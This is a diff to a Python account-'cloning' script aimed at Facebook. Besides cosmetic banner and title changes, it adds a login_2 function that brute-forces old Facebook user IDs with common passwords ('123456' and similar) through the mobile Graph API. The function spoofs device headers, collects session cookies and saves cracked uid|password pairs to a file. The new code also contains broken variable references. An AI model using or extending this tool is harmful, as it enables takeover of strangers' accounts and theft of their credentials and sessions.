@@ -166,7 +166,7 @@ def window1():
     ])
 
 # Set window title
-sys.stdout.write('\x1b]2;𓆩【🧬 𝐑𝐀𝐉𝐄𝐒𝐇 KING🧬】𓆪 \x07')
+sys.stdout.write('\x1b]2;𓆩【🧬 CROOT KING🧬】𓆪 \x07')
 
 
 def ____banner____():
@@ -178,13 +178,13 @@ def ____banner____():
     else:
         os.system('clear')
     print(f"""
-{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{b}⚡︎
 {b}                          ___                            __  
 {b}   ___  ___ ________ ____/ (_)__ ___   ___________ _____/ /__
 {y}  / _ \/ _ `/ __/ _ `/ _  / (_-</ -_) / __/ __/ _ `/ __/  '_/
 {r} / .__/\_,_/_/  \_,_/\_,_/_/___/\__/  \__/_/  \_,_/\__/_/\_\ 
 {r}/_/                                                                
-{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}
+{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{b}⚡︎{reset}
 """)
 
 
@@ -249,7 +249,7 @@ def clear():
 
 
 def linex():
-    print(f'{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}')
+    print(f'{m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{b}⚡︎{reset}')
 
 
 def BNG_71_():
@@ -257,7 +257,7 @@ def BNG_71_():
     Main menu function.
     """
     ____banner____()
-    print(f'       {w}𒁍{r}A. {c}OLD CLONE{reset}')
+    print(f'       {b}𒁍{r}A. {c}OLD CLONE{reset}')
     linex()
     __Jihad__ = input(f"       {y}★{r}CHOICE {reset} {W}: {Y}")
     if __Jihad__ in ('A', 'a', '01', '1'):
@@ -273,11 +273,11 @@ def old_clone():
     Menu for selecting old account cloning type.
     """
     ____banner____()
-    print(f'       {w}𒁍A.{c}ALL SERIES{reset}')
+    print(f'       {b}𒁍A.{c}ALL SERIES{reset}')
     linex()
-    print(f'       {w}𒁍B.{c}100003/4 SERIES{reset}')
+    print(f'       {b}𒁍B.{c}100003/4 SERIES{reset}')
     linex()
-    print(f'       {w}𒁍C.{c}2009 series{reset}')
+    print(f'       {b}𒁍C.{c}2009 series{reset}')
     linex()
     _input = input(f"       {y}★{r}CHOICE  {W}: {Y}{reset}")
     if _input in ('A', 'a', '01', '1'):
@@ -421,7 +421,7 @@ def login_1(uid):
         sys.stdout.write(
             f"\r\r\r{y}⭐{b}PARADISE{y}⭐{reset}"
             f"{b}⚡︎{y}{loop}{b}⚡︎"
-            f"{g}🟢{c}OK {g}{len(oks)}{g}🟢{reset}"
+            f"{b}➤{c}OK {g}{len(oks)}{b}🔥{reset}"
         )
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
@@ -622,6 +622,86 @@ def login_1(uid):
 
     except Exception:
         time.sleep(5)
+
+def login_2(uid):
+    global loop, oks, cps, ua
+
+    try:
+        session = requests.Session()
+        sys.stdout.write(
+            f"\r{c}[GRAPH]{w} {uid} {c}[{loop}/{tl}] {g}OK:{len(oks)}{w}"
+        )
+        sys.stdout.flush()
+
+        for pw in ("123456", "1234567", "12345678", "123456789"):
+            ua = ua_graph()
+
+            data = {
+                "adid": str(uuid.uuid4()),
+                "device_id": str(uuid.uuid4()),
+                "family_device_id": str(uuid.uuid4()),
+                "advertiser_id": str(uuid.uuid4()),
+                "format": "json",
+                "cpl": "true",
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": uid,
+                "password": pw,
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "generate_session_cookies": "1",
+                "currently_logged_in_userid": "0",
+                "locale": "en_US",
+                "client_country_code": "US",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "graphservice",
+                "api_key": "882a8490361da98702bf97a021ddc14d"
+            }
+
+            headers = {
+                "User-Agent": ua,
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "X-FB-HTTP-Engine": "Liger",
+                "X-FB-Connection-Type": "MOBILE.LTE",
+                "X-FB-Connection-Quality": "EXCELLENT",
+                "X-FB-Net-HNI": str(rr(20000, 40000)),
+                "X-FB-SIM-HNI": str(rr(20000, 40000)),
+                "X-FB-Connection-Bandwidth": str(rr(20000000, 50000000)),
+            }
+
+            res = session.post(
+                "https://b-graph.facebook.com/auth/login",
+                data=data,
+                headers=headers,
+                allow_redirects=False
+            ).json()
+
+            if "session_key" in res:
+                cookie = ";".join(
+                    f"{c['name']}={c['value']}"
+                    for c in resp.get("session_cookies", [])
+                )
+                print(f"""
+{g}┌──────────────────────────────┐
+│         LOGIN SUCCESS        │
+├──────────────────────────────┤
+│ UID  : {uid}
+│ PASS : {pw}
+│ TAHUN : {tahun(uid)}
+│ COOKIES : {cookies}
+│ USER-AGENTS : {ua}
+└──────────────────────────────┘{w}
+""")
+                open("/sdcard/PATRIOT-OK.txt", "a").write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+
+        loop += 1
+
+    except:
+        time.sleep(1)
 
 if __name__ == '__main__':
     BNG_71_()
